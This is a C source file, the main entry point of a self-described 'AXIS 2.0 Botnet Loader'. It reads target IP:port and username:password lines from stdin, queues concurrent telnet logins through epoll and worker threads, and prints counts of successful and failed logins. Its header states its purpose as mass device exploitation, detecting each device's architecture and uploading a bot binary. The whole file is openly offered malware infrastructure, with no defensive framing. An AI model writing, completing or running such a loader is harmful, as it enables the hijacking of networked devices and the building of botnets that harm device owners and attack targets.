/*
 * AXIS 2.0 Botnet Loader - Main Entry Point
 * ============================================================================
 * Production-grade telnet loader for mass device exploitation
 * Reads IP:port credentials from stdin, manages concurrent connections
 * Automatically detects architecture and uploads appropriate binary
 * ============================================================================
 */

#include "includes.h"
#include "server.h"
#include "binary.h"
#include "util.h"
#include "connection.h"

static struct server *srv;
static int epoll_fd;
static int listen_fd;

static void stats_thread(void *arg);
static void event_thread(void *arg);

int main(int argc, char **args) {
    struct epoll_event ev;
    struct sockaddr_in addr;
    int opt = 1;

    printf("AXIS 2.0 Botnet Loader\n");
    printf("========================\n\n");

    /* Load binaries */
    if (!binary_init()) {
        printf("Failed to load binaries!\n");
        return 1;
    }

    /* Create server */
    srv = server_create();
    if (srv == NULL) {
        printf("Failed to create server!\n");
        return 1;
    }

    /* Create epoll */
    epoll_fd = epoll_create(1);
    if (epoll_fd == -1) {
        perror("epoll_create");
        return 1;
    }

    /* Create listen socket */
    listen_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (listen_fd == -1) {
        perror("socket");
        return 1;
    }

    /* Set socket options */
    setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    fcntl(listen_fd, F_SETFL, O_NONBLOCK);

    /* Bind to port for incoming connections */
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(0);  /* Let kernel assign port */

    if (bind(listen_fd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
        perror("bind");
        return 1;
    }

    /* Start stats thread */
    pthread_t stats_thread_id;
    pthread_create(&stats_thread_id, NULL, (void *(*)(void *))stats_thread, NULL);

    /* Start event processing thread */
    pthread_t event_thread_id;
    pthread_create(&event_thread_id, NULL, (void *(*)(void *))event_thread, NULL);

    printf("Loader ready. Feed IPs via stdin.\n");
    printf("Format: IP:PORT username:password [architecture]\n\n");

    /* Read IPs from stdin */
    char line[4096];
    while (fgets(line, sizeof(line), stdin) != NULL) {
        /* Trim newline */
        char *nl = strchr(line, '\n');
        if (nl) *nl = 0;

        /* Skip empty lines */
        if (strlen(line) == 0) continue;

        /* Queue telnet connection */
        server_queue_telnet(srv, line);
    }

    /* Wait for event thread */
    pthread_join(event_thread_id, NULL);

    return 0;
}

static void event_thread(void *arg) {
    struct epoll_event events[128];

    while (TRUE) {
        int n = epoll_wait(epoll_fd, events, 128, 100);
        if (n == -1) {
            if (errno == EINTR) continue;
            break;
        }

        for (int i = 0; i < n; i++) {
            struct connection *conn = (struct connection *)events[i].data.ptr;
            if (conn != NULL) {
                connection_handler(conn);
            }
        }
    }
}

static void stats_thread(void *arg) {
    time_t last = time(NULL);

    while (TRUE) {
        sleep(1);

        time_t now = time(NULL);
        if (now - last >= 5) {
            printf("\r\033[K[%ld] Conn: %d | Logins: %d | Success: %d | Fail: %d",
                now,
                srv->curr_open,
                srv->total_logins,
                srv->total_successes,
                srv->total_fails);
            fflush(stdout);
            last = now;
        }
    }
}
